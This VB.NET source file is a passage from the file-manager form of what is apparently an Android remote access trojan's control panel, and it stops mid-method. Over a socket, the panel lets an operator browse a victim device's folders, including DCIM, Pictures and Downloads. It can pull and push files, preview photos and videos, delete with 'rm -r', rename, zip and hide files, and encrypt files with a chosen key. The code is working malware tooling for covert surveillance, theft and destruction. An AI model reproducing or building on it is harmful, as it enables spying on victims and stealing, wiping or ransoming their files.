Public Class FileManager

    Public Client As Net.Sockets.TcpClient

    Public classClient As sockets.Client

    Public Title As String = "null"

    Public ver As String = "n/a"

    Private BoxTitlePaintEventArgsWait As Boolean = False

    Private FSize As String = "Large text editing is not allowed {1}  -->{0}"

    Private Q As String = "75"





    'Adobe files : 
    'PDF (.pdf)
    'Illustrator (.ai, .eps)
    'Photoshop (.psd)
    'Images (.bmp, gif, .jpeg, .jpg, .png, .tif, .tiff, .svg)
    'Microsoft files
    'Microsoft Word documents (.doc, .docx)
    'Microsoft PowerPoint presentations (.ppt, .pptx, .pptm, .pps, .ppsm, .ppsx)
    'Microsoft Excel spreadsheets (.xls, .xlsx)
    'Raw images(.cr2, .crw, .nef, .nrw, .sr2, .dng, .arw, .orf)
    'Text files(.txt, .csv, .rtf, .odt, .md)
    'Videos (.3gp, .3gpp, .3gpp2, .asf, .avi, .dv, .m2t, .m4v, .mkv, .mov, .mp4, .mpeg, .mpg, .mts, .oggtheora, .ogv, .rm, .ts, .vob, .webm, .wmv, .flv)

    Private Sub SpyStyle()

        BoxTitle.BackColor = SpySettings.DefaultColor_Background

        For Each gr As DataGridView In Me.Controls.OfType(Of DataGridView)()
            gr.BackgroundColor = SpySettings.DefaultColor_Background
            gr.BackColor = SpySettings.DefaultColor_Background
            gr.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background
            gr.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background

            '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

            gr.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground
            gr.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground
            gr.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground


        Next

    End Sub

    Private Sub FileManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Icon = New Icon(reso.res_Path & "\Icons\win\9.ico")

        SpyStyle()

        DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f

        DGV0.DefaultCellStyle.Font = reso.f

        Me.ctxMenu.Renderer = New ThemeToolStrip

        Me.Text = Title


        PathsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        PathsToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\paths.png")
        PathsToolStripMenuItem.Tag = {0, "null", "null"}

        OpenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        OpenToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\open.png")
        OpenToolStripMenuItem.Tag = {0, "null", "null"}

        RefreshToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        RefreshToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\refresh.png")
        RefreshToolStripMenuItem.Tag = {0, "null", "null"}

        ViewToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ViewToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\viewfile.png")
        ViewToolStripMenuItem.Tag = {0, "null", "null"}

        DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        DownloadToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\download.png")
        DownloadToolStripMenuItem.Tag = {0, "null", "null"}

        UploadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        UploadToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\upload.png")
        UploadToolStripMenuItem.Tag = {0, "null", "null"}

        EncryptToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        EncryptToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\encrypt.png")
        EncryptToolStripMenuItem.Tag = {0, "null", "null"}

        DecodeToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        DecodeToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\decode.png")
        DecodeToolStripMenuItem.Tag = {0, "null", "null"}

        ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ZipToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\zip.png")
        ZipToolStripMenuItem.Tag = {0, "null", "null"}

        UnZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        UnZipToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\unzip.png")
        UnZipToolStripMenuItem.Tag = {0, "null", "null"}

        DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        DeleteToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\delete.png")
        DeleteToolStripMenuItem.Tag = {0, "null", "null"}

        AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        AddFilesToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\add.png")
        AddFilesToolStripMenuItem.Tag = {0, "null", "null"}

        RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        RenameToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\rename.png")
        RenameToolStripMenuItem.Tag = {0, "null", "null"}

        EditToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        EditToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\edit.png")
        EditToolStripMenuItem.Tag = {0, "null", "null"}

        HideToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        HideToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\hidden.png")
        HideToolStripMenuItem.Tag = {0, "null", "null"}

        ShowToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        ShowToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\show.png")
        ShowToolStripMenuItem.Tag = {0, "null", "null"}

        FolderDownloadsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        FolderDownloadsToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\downloads.png")
        FolderDownloadsToolStripMenuItem.Tag = {0, "null", "null"}

        CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        CutToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\cut.png")
        CutToolStripMenuItem.Tag = {0, "null", "null"}

        CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        CopyToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\copy.png")
        CopyToolStripMenuItem.Tag = {0, "null", "null"}


        PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        PasteToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\paste.png")
        PasteToolStripMenuItem.Tag = {0, "null", "null"}

        SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        SetWallpaperToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\wallpaper.png")
        SetWallpaperToolStripMenuItem.Tag = {0, "null", "null"}

        PlaySoundToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
        PlaySoundToolStripMenuItem.Image = New Bitmap(reso.res_Path & "\Icons\Menu_Items\17\playsound.png")
        PlaySoundToolStripMenuItem.Tag = {0, "null", "null"}



        CType(PathsToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False

        CType(PathsToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ctxMenu.BackColor

        Me.TOpacity.Interval = SpySettings.T_Interval

        Me.TOpacity.Enabled = True

        BoxTitlePaintEventArgsWait = True

    End Sub

    Private Sub DGV0_SortCompare(sender As Object, e As DataGridViewSortCompareEventArgs) Handles DGV0.SortCompare

        If e.RowIndex1 = 0 Then

            e.Handled = True

        End If

    End Sub
    Private Sub DGV0_CellMouseDoubleClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DGV0.CellMouseDoubleClick

        If e.RowIndex > 0 AndAlso e.ColumnIndex >= 0 Then

            If DGV0.Rows.Item(e.RowIndex).Cells(0).Tag = "0" Then

                If Not classClient Is Nothing Then

                    Dim obj As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & Pnext(DGV0.Tag, DGV0.Rows.Item(e.RowIndex).Cells(1).Value), Codes.Encoding().GetBytes("null"), classClient}

                    classClient.Send(obj)

                End If

            Else

                Dim p As String = DGV0.Tag & "/" & DGV0.Rows(e.RowIndex).Cells(1).Value

                Dim tg As String = DGV0.Rows.Item(e.RowIndex).Cells(0).Tag

                Dim t As String = DGV0.Rows(e.RowIndex).Cells(1).Value

                If tg = "1" Then

                    If ISupportedText(t.ToLower) Then

                        Dim getSize As Object = DGV0.Rows.Item(e.RowIndex).Cells(2).Tag

                        Dim CheckSize As Boolean = If(getSize <= 500 * 1024, True, False)

                        If CheckSize Then

                            If Not classClient Is Nothing Then

                                Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.editor & sockets.Data.SPL_SOCKET & "edit" & sockets.Data.SPL_DATA & p, Codes.Encoding().GetBytes("null"), classClient}

                                classClient.Send(objs)

                            End If

                        Else

                            MsgBox(String.Format(FSize, DGV0.Rows.Item(e.RowIndex).Cells(2).Value, DGV0.Rows.Item(e.RowIndex).Cells(1).Value), MsgBoxStyle.Critical, reso.nameRAT)

                        End If


                    Else

                        Dim status As Object = "null"

                        If ISupportedImages(t.ToLower) Then

                            status = "false"

                        ElseIf ISupportedVideo(t.ToLower) Then

                            status = "true"

                        Else

                            status = "null"

                        End If

                        If Not status = "null" Then

                            If Not classClient Is Nothing Then

                                Dim spl As String() = classClient.Keys.Split(":")

                                Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "small" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & status & sockets.Data.SPL_DATA & Q & sockets.Data.SPL_DATA & SecurityKey.ImageViewer, Codes.Encoding().GetBytes("null"), classClient}

                                classClient.Send(objs)

                            End If

                        End If

                    End If

                End If

            End If

        ElseIf e.RowIndex = 0 AndAlso e.ColumnIndex >= 0 Then

            If Not classClient Is Nothing Then

                Dim obj As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & Pback(DGV0.Tag), Codes.Encoding().GetBytes("null"), classClient}

                classClient.Send(obj)

            End If

        End If

    End Sub
    Private Function Pback(ByVal p As String)

        Dim a As String = String.Format("{0}", p.Substring(0, p.LastIndexOf("/")))

        Return If(a.Contains("/"), a, "/")

    End Function

    Private Function Pnext(ByVal p As String, ByVal n As String)

        Return String.Format("{0}/{1}", p, n)

    End Function

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click

        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                If tg = "1" Then

                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    If Not classClient Is Nothing Then

                        Dim spl As String() = classClient.Keys.Split(":")

                        Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "download" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & SecurityKey.down_info & sockets.Data.SPL_DATA & SecurityKey.downByte & sockets.Data.SPL_DATA & classClient.UUID, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Next

        End If

    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click

        If Not classClient Is Nothing Then

            FilesUpload.Title = "Please select Files"

            FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)

            FilesUpload.Filter = "all Files|*.*"

            FilesUpload.FileName = String.Empty

            FilesUpload.Multiselect = True

            If FilesUpload.ShowDialog() = DialogResult.OK Then

                If Not classClient Is Nothing Then

                    Dim ar As String() = FilesUpload.FileNames

                    If ar.Length > 0 Then

                        For Each i In ar

                            Dim spl As String() = classClient.Keys.Split(":")

                            Try

                                Dim FI As New IO.FileInfo(i)

                                Dim si As String = CStr(FI.Length)

                                Dim p As String = DGV0.Tag & "/" & FI.Name

                                Dim nm As String = FI.Name

                                Dim funm As String = FI.FullName

                                Dim obj As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "upload" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & si & sockets.Data.SPL_DATA & nm & sockets.Data.SPL_DATA & funm & sockets.Data.SPL_DATA & SecurityKey.upload_info & sockets.Data.SPL_DATA & SecurityKey.uploadByte, Codes.Encoding().GetBytes("null"), classClient}

                                classClient.Send(obj)

                            Catch ex As Exception

                            End Try

                        Next

                    End If

                End If

            End If

        End If

    End Sub

    Private Sub ViewToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ViewToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                If tg = "1" Then

                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    Dim t As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    Dim status As Object = "null"

                    If ISupportedImages(t.ToLower) Then

                        status = "false"

                    ElseIf ISupportedVideo(t.ToLower) Then

                        status = "true"

                    Else

                        status = "null"

                    End If

                    If Not status = "null" Then

                        If Not classClient Is Nothing Then

                            Dim spl As String() = classClient.Keys.Split(":")

                            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "small" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & status & sockets.Data.SPL_DATA & Q & sockets.Data.SPL_DATA & SecurityKey.ImageViewer, Codes.Encoding().GetBytes("null"), classClient}

                            classClient.Send(objs)

                        End If

                    End If

                End If

            Next

        End If
    End Sub

    Private Sub ExternalStorageDirectoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExternalStorageDirectoryToolStripMenuItem.Click

        If Not classClient Is Nothing Then

            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get0", Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

        End If

    End Sub

    Private Sub DirectoryDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DirectoryDownloadsToolStripMenuItem.Click

        If Not classClient Is Nothing Then

            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get1", Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

        End If

    End Sub

    Private Sub DirectoryPicturesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DirectoryPicturesToolStripMenuItem.Click

        If Not classClient Is Nothing Then

            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get2", Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

        End If

    End Sub

    Private Sub DirectoryDCIMToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DirectoryDCIMToolStripMenuItem.Click

        If Not classClient Is Nothing Then

            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get3", Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

        End If

    End Sub

    Private Sub CustomToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CustomToolStripMenuItem.Click
        Dim p As New inp

        p.Text = "Access Path"

        p.LTitle.Text = "Add path"

        p.InputText.Text = If(DGV0.Tag.ToString.Length = 0, "/", DGV0.Tag.ToString)

        p.StartPosition = FormStartPosition.Manual

        p.Location = Codes.FixSize(Me, p)

        Dim getPATH As String = Nothing

        Select Case p.ShowDialog(Me)

            Case DialogResult.OK

                If Not classClient Is Nothing Then

                    Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & p.InputText.Text, Codes.Encoding().GetBytes("null"), classClient}

                    classClient.Send(objs)

                End If

        End Select

        p.Close()

    End Sub

    Private Sub FolderDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FolderDownloadsToolStripMenuItem.Click

        If Not classClient Is Nothing Then
            Dim down As String = classClient.FolderUSER & "\Downloads"

            If Not IO.Directory.Exists(down) Then

                IO.Directory.CreateDirectory(down)

            End If

            Process.Start(down)
        End If



    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If Not classClient Is Nothing Then

            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & DGV0.Tag, Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

        End If
    End Sub


    Private Sub DecodeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecodeToolStripMenuItem.Click


        If Not classClient Is Nothing Then

            Dim pd As New inp

            pd.Text = "decryption"

            pd.LTitle.Text = "Add decryption key"

            pd.InputText.Text = My.Settings.EncryptionKey

            pd.StartPosition = FormStartPosition.Manual

            pd.Location = Codes.FixSize(Me, pd)

            Select Case pd.ShowDialog(Me)

                Case DialogResult.OK

                    If Not classClient Is Nothing Then

                        If DGV0.SelectedRows.Count > 0 Then

                            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                                If tg = "1" Then

                                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                                    Dim out As String = Nothing

                                    Dim concat As String = ".crypt"

                                    If p.EndsWith(concat) Then

                                        Dim iLast As Integer = p.LastIndexOf(concat)

                                        out = p.Substring(0, iLast)

                                    Else

                                        out = p & ".decrypt"

                                    End If

                                    Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "decrypt" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & out & sockets.Data.SPL_DATA & pd.InputText.Text, Codes.Encoding().GetBytes("null"), classClient}

                                    classClient.Send(objs)

                                End If

                            Next

                        End If

                    End If

            End Select

            pd.Close()

        End If

    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click




        If Not classClient Is Nothing Then

            Dim pd As New inp

            pd.Text = "encryption"

            pd.LTitle.Text = "Add encryption key"

            pd.InputText.Text = My.Settings.EncryptionKey

            pd.StartPosition = FormStartPosition.Manual

            pd.Location = Codes.FixSize(Me, pd)

            Select Case pd.ShowDialog(Me)

                Case DialogResult.OK

                    If Not classClient Is Nothing Then

                        If DGV0.SelectedRows.Count > 0 Then

                            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                                If tg = "1" Then

                                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                                    Dim out As String = Nothing

                                    Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "encrypt" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & ".crypt" & sockets.Data.SPL_DATA & pd.InputText.Text, Codes.Encoding().GetBytes("null"), classClient}

                                    classClient.Send(objs)

                                    My.Settings.EncryptionKey = pd.InputText.Text

                                    My.Settings.Save()

                                End If

                            Next

                        End If


                    End If

            End Select

            pd.Close()

        End If



    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click

        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                Dim sn As String = "del0"

                Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                If tg = "0" Then

                    sn = "del1"

                    Dim frmt As String = p

                    p = "rm -r" & Space(1) & Format_Space(frmt)

                End If

                If Not classClient Is Nothing Then

                    Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & sn & sockets.Data.SPL_DATA & p, Codes.Encoding().GetBytes("null"), classClient}

                    classClient.Send(objs)

                    If Not tg = "back" Then

                        DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)

                    End If

                End If

            Next

        End If

    End Sub

    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                If tg = "1" Then

                    Dim getSize As Object = DGV0.Rows.Item(DGV0.SelectedRows(i).Index).Cells(2).Tag

                    Dim CheckSize As Boolean = If(getSize <= 500 * 1024, True, False)

                    If CheckSize Then

                        If Not classClient Is Nothing Then

                            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.editor & sockets.Data.SPL_SOCKET & "edit" & sockets.Data.SPL_DATA & p, Codes.Encoding().GetBytes("null"), classClient}

                            classClient.Send(objs)

                        End If

                    Else

                        MsgBox(String.Format(FSize, DGV0.Rows.Item(DGV0.SelectedRows(i).Index).Cells(2).Value, DGV0.Rows.Item(DGV0.SelectedRows(i).Index).Cells(1).Value), MsgBoxStyle.Critical, reso.nameRAT)

                    End If

                End If

            Next

        End If
    End Sub

    Private Sub DGV0_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.CellContentClick

    End Sub

    Private Sub ZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ZipToolStripMenuItem.Click
        If Not classClient Is Nothing Then

            Dim pd As New inp

            pd.Text = "Zip"

            pd.LTitle.Text = "File Name"

            pd.InputText.Text = "new file.zip"

            pd.StartPosition = FormStartPosition.Manual

            pd.Location = Codes.FixSize(Me, pd)

            Dim sb As New Text.StringBuilder


            Select Case pd.ShowDialog(Me)

                Case DialogResult.OK

                    If Not classClient Is Nothing Then

                        If DGV0.SelectedRows.Count > 0 Then

                            Dim pathFile As String = DGV0.Tag & "/" & pd.InputText.Text

                            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                                If tg = "1" Then

                                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                                    sb.Append(p & sockets.Data.SPL_LINE)

                                End If

                            Next

                            If sb.ToString.Length > 0 Then

                                Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "zip" & sockets.Data.SPL_DATA & sb.ToString & sockets.Data.SPL_DATA & pathFile, Codes.Encoding().GetBytes("null"), classClient}

                                classClient.Send(objs)

                            End If


                        End If

                    End If

            End Select

            pd.Close()

        End If
    End Sub

    Private Sub UnZipToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnZipToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                If tg = "1" Then

                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    Dim here As String = DGV0.Tag & "/"

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "unzip" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & here, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If


            Next

        End If
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click

        If Not classClient Is Nothing Then

            If DGV0.SelectedRows.Count = 1 Then

                Dim pd As New inp

                pd.Text = "Rename"

                pd.LTitle.Text = "new Name"

                pd.StartPosition = FormStartPosition.Manual

                pd.Location = Codes.FixSize(Me, pd)

                For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                    pd.InputText.Text = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                Next

                Select Case pd.ShowDialog(Me)

                    Case DialogResult.OK

                        If Not classClient Is Nothing Then

                            If DGV0.SelectedRows.Count = 1 Then

                                For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                                    Dim old As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                                    Dim neew As String = DGV0.Tag & "/" & pd.InputText.Text

                                    If Not old = neew Then

                                        Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & old & sockets.Data.SPL_DATA & neew, Codes.Encoding().GetBytes("null"), classClient}

                                        classClient.Send(objs)

                                    End If

                                Next

                            End If

                        End If

                End Select

                pd.Close()

            End If

        End If

    End Sub

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then

